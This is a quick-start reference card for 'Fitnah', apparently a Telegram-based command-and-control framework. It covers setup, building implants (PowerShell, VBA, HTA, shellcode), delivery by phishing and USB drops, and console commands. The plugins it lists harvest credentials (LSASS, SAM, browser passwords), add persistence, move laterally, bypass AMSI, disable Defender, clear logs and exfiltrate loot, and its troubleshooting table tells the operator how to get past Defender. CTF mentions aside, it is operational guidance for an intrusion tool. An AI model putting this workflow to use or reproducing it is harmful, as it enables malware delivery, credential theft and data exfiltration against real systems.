# Fitnah C2 - Quick Start Reference Card

## Install & Configure (5 minutes)

```bash
# 1. Clone
git clone https://github.com/yourusername/fitnah.git
cd fitnah

# 2. Dependencies
pip install -r requirements.txt

# 3. Create Telegram bot
# - Message @BotFather on Telegram
# - Type: /newbot
# - Copy the TOKEN
# - Create a private group, add bot as admin
# - Get chat ID from bot (send /start)

# 4. Configure
cat > config/framework.yaml << 'EOF'
operator:
  tag: operator1
  allowed_telegram_ids: [YOUR_TELEGRAM_ID]
telegram:
  token: YOUR_BOT_TOKEN
  operator_chat_id: -100YOUR_GROUP_ID
discord:
  enabled: false
c2:
  http_enabled: false
EOF

# 5. Start
python main.py --config config/framework.yaml
```

## Typical Workflow

```
1. LISTEN (Telegram bot waits for agent checkin)
   [Framework running, waiting...]

2. BUILD IMPLANT
   > builder -f ps1 -a agent-001
   → Generates PowerShell stager in build/

3. DELIVER TO TARGET
   - Email/phishing
   - USB drop
   - Network share
   - Web drive-by

4. AGENT EXECUTES
   - PowerShell runs stager
   - Implant checks in via Telegram
   - Operator receives notification

5. OPERATOR CONTROLS
   > sessions -i agent-001
   > use screenshot
   > run
   → Screenshot captured and sent to Telegram

6. COLLECT LOOT
   > loot
   → Database of all exfiltrated data
```

## Console Commands (Cheat Sheet)

### Agents
```
sessions              # List all connected agents
sessions -i ID       # Select an agent (use in prompts)
sessions -k ID       # Kill (disconnect) an agent
agents               # Rich table view with IP/OS/privilege
```

### Plugins
```
use <name>           # Load a plugin (e.g., 'use screenshot')
options              # Show current plugin parameters
set KEY VALUE        # Set parameter (e.g., 'set quality 90')
run                  # Execute against selected agent
run -s ID            # Execute on specific agent
search KEYWORD       # Find plugins by name/MITRE
plugins              # List all plugins
info <name>          # Show plugin details
reload               # Hot-reload all plugins (no restart)
```

### Builder
```
builder -f ps1 -a ID           # Build PowerShell stager
builder -f exe -a ID           # Build EXE (requires mingw-w64)
builder -f vba -a ID           # Build VBA macro
builder -f hta -a ID           # Build HTA app
builder -f shellcode -a ID     # Build raw shellcode (requires Donut)
builder --list                 # Show recent builds
```

### Files
```
shell <cmd>                      # Raw shell command
download ID /path/to/file        # Download from agent
upload ID /local/file /remote    # Upload to agent
screenshot ID                    # Capture screenshot
```

### Automation
```
schedule PLUGIN SECONDS ID      # Recurring task (e.g., 'schedule screenshot 30')
schedules                       # List all schedules
unschedule ID                   # Remove a schedule
```

### Loot & Audit
```
loot                    # List all loot
loot -q KEYWORD         # Search loot by keyword
loot -t TYPE           # Filter by type (credential/file/screenshot)
loot -d ID             # Show raw data for entry
loot --export csv      # Export as CSV
audit [N]              # Show last N audit entries
audit-verify           # Verify HMAC integrity
```

### Infrastructure
```
profile list           # Show C2 profiles
profile set NAME       # Hot-swap profile (no restart)
listeners             # Transport status
status                # Server health
project info          # Current project details
```

## Common Plugins by Use Case

### Reconnaissance
```
use sysinfo           # OS, architecture, privileges
use screenshot        # Capture screen
use processes         # List processes
use port_scan         # Scan network ports
use domain_enum       # Enumerate AD domain
```

### Credential Harvesting
```
use browser_creds     # Chrome/Firefox
use wifi_creds        # Saved WiFi networks
use dump_sam          # Local SAM hashes
use lsass_dump        # LSASS memory dump
use clipboard         # Monitor clipboard
```

### Persistence
```
use registry_run      # Add to Run key
use scheduled_task    # Task scheduler entry
use startup_folder    # Startup folder shortcut
use wmi_subscribe     # WMI event subscription
```

### Lateral Movement
```
use psexec            # PsExec-style execution
use wmi_exec          # WMI process execution
use domain_enum       # Find targets
use shares_enum       # Find shared folders
use rdp_enable        # Enable RDP (if admin)
```

### Defense Evasion
```
use amsi_bypass       # Bypass AMSI
use etw_patch         # Patch ETW
use defender_exclude  # Exclude path from Defender
use disable_defender  # Disable Windows Defender
use clear_logs        # Clear event logs
```

### Data Exfiltration
```
use upload_file       # Upload to server
use zip_exfil         # ZIP + exfiltrate
use chunked_send      # Split large files
use flag_submit       # Submit flag to CTF scoreboard
```

## Environment Variables

```bash
# Secure token storage (don't commit!)
export TELEGRAM_TOKEN="..."
export DISCORD_TOKEN="..."
export FITNAH_AUDIT_KEY="..."

# Or use .env file
TELEGRAM_TOKEN=...
DISCORD_TOKEN=...
```

Then in config:
```yaml
telegram:
  token: ${TELEGRAM_TOKEN}
```

## Parameter Examples

### Screenshot Plugin
```
> use screenshot
> set monitor 0         # 0=all monitors, 1=primary
> set quality 85        # 1-100 (JPEG quality)
> run
```

### Port Scan Plugin
```
> use port_scan
> set target 10.0.0.5
> set ports 22,80,443,3389
> set method auto        # auto|nmap|masscan|ps
> run
```

### Scheduled Task
```
> schedule screenshot 10 agent-001     # Every 10 seconds
> schedule port_scan 300 agent-001     # Every 5 minutes
> schedules                            # List active schedules
```

## CTF Commands

### Auto Flag Submission
```
> schedule flag_submit 5 agent-001    # Check every 5 seconds
> use flag_submit
> set url http://flagserver:8000/flag
> set flag FLAG{...}
> run
```

### Multi-Stage Exploitation
```
> use initial_access    # Get reverse shell
> use persistence       # Plant backdoor
> use credential_access # Harvest creds
> use lateral_movement  # Move to other machines
> use flag_submit       # Submit flag
> loot                  # Collect all data
```

## VPS Deployment

```bash
# On Ubuntu/Debian VPS
sudo apt update && sudo apt install python3.10 python3-pip

# Download Fitnah
git clone https://github.com/yourusername/fitnah.git
cd fitnah

# Install in screen session (persistent)
screen -S fitnah
pip install -r requirements.txt
python main.py --config config/framework.yaml

# Detach with Ctrl+A, D
# Resume later: screen -r fitnah
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| **Bot not responding** | Check token in config, verify bot is admin in group |
| **Agent doesn't checkin** | Verify agent has internet access to `api.telegram.org:443` |
| **Build fails** | Use PS1 format instead of EXE, or install mingw-w64 |
| **Defender blocks** | Use AMSI bypass plugin, or VBA/HTA format |
| **Telegram blocked** | Use HTTP listener or Discord fallback |
| **Network isolated** | Use reverse shell transport |

## File Locations

```
config/framework.yaml       # Main config file
data/sessions.db            # Connected agents database
data/audit.jsonl            # Audit log (HMAC-signed)
data/loot.db                # Exfiltrated data
data/schedules.json         # Task schedules
build/                      # Generated payloads
downloads/                  # Downloaded files
screenshots/                # Captured screenshots
fitnah/plugins/             # Plugin directory
```

## Security Reminders

- ✓ Never commit `config/framework.yaml` with real tokens
- ✓ Use environment variables or `.env` for secrets
- ✓ Rotate bot tokens after each engagement
- ✓ Monitor audit log for forensics
- ✓ Use TLS for HTTP listener (enable HTTPS)
- ✓ Clean up persistence before handing back system

## Documentation References

| Goal | Read |
|------|------|
| Setup on VPS | [README_SETUP.md](README_SETUP.md) |
| Configure Telegram | [README_TELEGRAM.md](README_TELEGRAM.md) |
| Learn all CLI commands | [README_USAGE.md](README_USAGE.md) |
| Build custom plugins | [README_PLUGINS.md](README_PLUGINS.md) |
| CTF automation | [README_CTF_ADVANCED.md](README_CTF_ADVANCED.md) |
| Evasion & persistence | [README_HOSTILE.md](README_HOSTILE.md) |
| All docs index | [DOCUMENTATION.md](DOCUMENTATION.md) |

## One-Liners

```bash
# Build and deploy PS1 in one go
python main.py && builder -f ps1 -a agent-001 && cat build/*.ps1

# Monitor agent activity
watch -n 1 'python main.py | grep -i checkin'

# Export loot as CSV
> loot --export csv --out engagement.csv

# Cleanup (remove persistence)
> use registry_run
> set remove true
> run
```

## Next Steps

1. Read [README_SETUP.md](README_SETUP.md) for full setup
2. Configure Telegram bot
3. Start framework
4. Build first implant
5. Deploy to test target
6. Execute plugins
7. Collect loot

---

**Version:** Fitnah v2.0  
**Status:** Production Ready ✓  
**Last Updated:** 2025-06-17
